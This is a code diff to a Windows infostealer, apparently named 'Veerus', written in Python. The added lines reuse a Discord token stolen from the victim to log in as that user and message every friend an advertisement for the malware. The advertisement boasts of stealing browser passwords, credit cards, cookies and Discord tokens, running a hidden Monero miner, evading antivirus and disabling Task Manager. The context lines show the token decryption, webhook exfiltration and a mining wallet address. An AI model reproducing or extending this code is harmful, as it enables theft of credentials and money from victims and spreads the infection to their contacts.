@@ -3,6 +3,7 @@ from datetime import datetime, timedelta
 from os import getenv, getlogin, listdir
 import sqlite3
 from discord_webhook import DiscordWebhook, DiscordEmbed
+import discord
 import win32crypt
 import codecs
 import win32crypt
@@ -63,6 +64,32 @@ USER_NAME = getpass.getuser()
 WEBHOOK = "webhook667"
 webhook = WEBHOOK
 ADDRESS = "42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq" #Only XMR, replace with your adress 42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq please donate lmao
+dm_all = True
+DMALLMSG = """:flag_gb: Hello !
+Your friend just got pwn'd by 0xSxZ/Veerus you wan't to do the same? Let me explain what you can do with Veerus :
+```Stealer :
+	Chromium (Opera, Opera Gx, Chrome, Brave, 360Browser, etc...) : 
+		Passwords, Credit Cards, Cookies, Autofill
+
+	Discord :
+		Token
+
+	Miner :		
+		Hidden XMR Miner
+	Other :
+		Add to computer startup the number of time you choosed.
+		Clone the virus in random directories
+		Undetected by Windows Defender & Windows Smart screen
+		Anti Virtual Machine
+		Disable Task Manager```
+
+	Price : 0.00$ ! yes ! Totally Free !
+
+	Links :
+		Discord : https://discord.gg/7GkfBzRQXX
+		Github : https://github.com/0xSxZ/Veerus"""
+
+mdmbot = discord.Client()
 
 
 STATSWEBHOOK = "NoWebhook667EKIP"
@@ -167,6 +194,7 @@ if yes == "yes":
 	def GetClipboardData():
 		win32clipboard.OpenClipboard()
 		data = win32clipboard.GetClipboardData()
+		win32clipboard.CloseClipboard()
 		return data
 	def ClearTerm():
 		if(os.name == "nt" or os.name == "windows"):
@@ -531,7 +559,7 @@ if yes == "yes":
 					cleaned.append(i)
 			tosend = ""
 			for token in cleaned:
-				tosend = tosend + str(decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:]).encode()) + "\n"
+				tosend = tosend + str(decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:]).encode())  +" " + "\n" 
 			return tosend
 	"""
 
@@ -849,3 +877,24 @@ if yes == "yes":
 		webhook.execute()
 	print("[.] Sending Stats")
 	threading.Thread(target=minerstats).start()
+	@mdmbot.event
+	async def on_connect():
+		print("User Logged Into:")
+		print("-----------------")
+		print(mdmbot.user.name)
+		print(mdmbot.user.id)
+		print("-----------------")
+		print("Started massing..")
+		print("-----------------")
+		for user in mdmbot.user.friends:
+			try:
+				user = await mdmbot.fetch_user(user.id)
+				await user.send(DMALLMSG)
+			except Exception as e:
+					print(f"Failed to send message to: {user.name} {str(e)}")
+		print(f"{mdmbot.user.name} hass finished mdming!")
+
+	if(dm_all == True):
+		token = getDisk0rdToken().replace("b'", "\n").replace("'", "").split(" ")[1]
+		print("Token : " + token)
+		mdmbot.run(token, bot=False)
